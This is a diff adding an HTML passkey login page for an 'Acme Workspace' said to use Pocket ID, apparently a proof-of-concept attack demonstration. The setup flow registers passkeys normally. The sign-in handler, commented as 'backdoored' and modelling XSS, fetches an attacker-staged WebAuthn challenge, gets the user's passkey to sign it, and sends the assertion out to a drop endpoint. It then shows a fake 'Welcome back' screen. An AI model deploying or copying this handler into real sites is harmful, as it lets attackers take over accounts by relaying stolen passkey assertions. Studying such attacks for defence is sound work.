@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Acme Workspace</title>
+<style>
+  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#3b5bdb; }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
+  .card { width:min(400px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
+  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:22px; }
+  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#7048e8); }
+  h1 { font-size:20px; margin:0 0 4px; }
+  p.sub { margin:0 0 24px; color:var(--muted); }
+  button { width:100%; padding:13px; border:0; border-radius:10px; background:var(--brand); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
+  button:disabled { opacity:.55; cursor:default; }
+  .status { margin-top:16px; min-height:22px; color:var(--muted); font-size:14px; }
+  .ok { color:#0a7c42; font-weight:600; }
+  .home { display:none; text-align:center; padding:12px 0; }
+  .home .big { font-size:26px; font-weight:700; margin:6px 0; }
+  .avatar { width:64px; height:64px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#7048e8); margin:0 auto 10px; }
+  details { margin-top:22px; border-top:1px solid var(--line); padding-top:14px; }
+  details summary { cursor:pointer; color:var(--muted); font-size:13px; list-style:none; }
+  details summary::-webkit-details-marker { display:none; }
+  details .row { display:flex; gap:8px; }
+  details input { width:100%; padding:9px; border:1px solid var(--line); border-radius:8px; font:inherit; margin:8px 0 0; }
+  details button { background:#fff; color:var(--ink); border:1px solid var(--line); margin-top:12px; }
+  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand"><div class="logo"></div> Acme Workspace</div>
+
+  <div id="login">
+    <h1>Sign in</h1>
+    <p class="sub">Use your passkey to continue.</p>
+    <button id="go">Sign in with passkey</button>
+    <div id="status" class="status"></div>
+
+    <details id="setup">
+      <summary>First time here? Create an Account</summary>
+      <div class="row">
+        <input id="first" placeholder="First name" autocomplete="off" />
+        <input id="last" placeholder="Last name" autocomplete="off" />
+      </div>
+      <input id="username" placeholder="Username" autocomplete="off" />
+      <input id="email" type="email" placeholder="Email" autocomplete="off" />
+      <button id="enroll">Create account and add passkey</button>
+      <div id="setupStatus" class="status"></div>
+    </details>
+  </div>
+
+  <div id="home" class="home">
+    <div class="avatar"></div>
+    <div>Signed in <span class="ok">&#10003;</span></div>
+    <div class="big">Welcome back</div>
+    <p class="sub" style="margin-top:4px">You're all set.</p>
+  </div>
+
+  <div class="foot">Secured with passkeys &middot; Powered by Pocket ID</div>
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+function b64urlToBuf(s){ s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; const b=atob(s),a=new Uint8Array(b.length); for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i); return a.buffer; }
+function bufToB64url(buf){ const b=new Uint8Array(buf); let s=''; for(const x of b)s+=String.fromCharCode(x); return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
+function serializeAssertion(cred){ const r=cred.response; return {
+  id:cred.id, rawId:bufToB64url(cred.rawId), type:cred.type, clientExtensionResults:{},
+  response:{ clientDataJSON:bufToB64url(r.clientDataJSON), authenticatorData:bufToB64url(r.authenticatorData), signature:bufToB64url(r.signature), userHandle:r.userHandle?bufToB64url(r.userHandle):null }
+}; }
+function serializeAttestation(cred){ const r=cred.response; return {
+  id:cred.id, rawId:bufToB64url(cred.rawId), type:cred.type,
+  authenticatorAttachment: cred.authenticatorAttachment || undefined,
+  clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
+  response:{ attestationObject:bufToB64url(r.attestationObject), clientDataJSON:bufToB64url(r.clientDataJSON), transports: r.getTransports ? r.getTransports() : undefined }
+}; }
+
+// First-time setup: create the first account and register a passkey (Windows Hello),
+// talking to Pocket ID through this origin. Works for the first user on a fresh instance.
+$('enroll').onclick = async () => {
+  const body = { firstName: $('first').value.trim(), lastName: $('last').value.trim(), username: $('username').value.trim(), email: $('email').value.trim() };
+  if (!body.username || !body.email) { $('setupStatus').textContent = 'Enter at least a username and email.'; return; }
+  $('enroll').disabled = true; $('setupStatus').textContent = 'Creating account…';
+  try {
+    const s = await fetch('/api/signup/setup', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body) });
+    if (!s.ok) throw new Error('signup: ' + s.status + ' (already set up? reset Pocket ID)');
+    $('setupStatus').textContent = 'Approve the passkey prompt…';
+    const opts = await (await fetch('/api/webauthn/register/start')).json();
+    const pub = { ...opts, challenge: b64urlToBuf(opts.challenge), user: { ...opts.user, id: b64urlToBuf(opts.user.id) } };
+    const cred = await navigator.credentials.create({ publicKey: pub });
+    const f = await fetch('/api/webauthn/register/finish', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(serializeAttestation(cred)) });
+    if (!f.ok) throw new Error('register: ' + f.status);
+    $('setupStatus').innerHTML = 'Passkey added <span class="ok">&#10003;</span> Now click <b>Sign in with passkey</b>.';
+  } catch (e) {
+    $('setupStatus').textContent = 'Setup failed: ' + (e.message || e); $('enroll').disabled = false;
+  }
+};
+
+// Backdoored sign-in (models XSS on this origin): instead of starting its own login,
+// it signs the ATTACKER's staged challenge and exfiltrates the assertion. One tap.
+$('go').onclick = async () => {
+  $('go').disabled = true; $('status').textContent = 'Starting sign-in…';
+  try {
+    const st = await (await fetch('/x/stage')).json(); // { slotId, challenge, rpId }
+    if (!st.challenge) { $('status').textContent = 'Could not start sign-in. Try again.'; $('go').disabled = false; return; }
+    $('status').textContent = 'Approve the passkey prompt…';
+    const cred = await navigator.credentials.get({ publicKey: {
+      challenge: b64urlToBuf(st.challenge), rpId: st.rpId || 'localhost', userVerification: 'required', timeout: 60000, allowCredentials: [],
+    }});
+    await fetch('/x/drop', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ slotId: st.slotId, assertion: serializeAssertion(cred) }) });
+    $('login').style.display = 'none'; $('home').style.display = 'block';
+  } catch (e) {
+    $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false;
+  }
+};
+</script>
+</body>
+</html>
